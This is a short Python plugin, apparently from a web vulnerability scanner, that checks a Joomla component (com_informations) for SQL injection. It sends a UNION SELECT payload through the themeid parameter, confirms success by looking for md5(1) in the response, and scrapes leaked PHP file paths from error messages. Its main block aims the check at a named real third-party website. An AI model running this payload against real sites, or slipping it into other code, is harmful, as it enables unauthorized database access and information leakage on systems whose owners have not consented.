#!/usr/bin/env python
#-*- encoding:utf-8 -*-

import re

def assign(service, arg):
    if service == "joomla":
        return True, arg

def audit(arg):
    payload = 'index.php?option=com_informations&view=sousthemes&themeid=999.9+union+select+111,222,md5(1)%23'
    url = arg + payload 
    code, head, res, errcode, _ = curl.curl(url )
    m = re.search('in <b>([^<]+)</b> on line <b>', res)
    if code == 200 and m:
        security_info(m.group(1))

    if code==200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
        security_hole(url)
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('joomla', 'http://www.cogest.fr/')[1])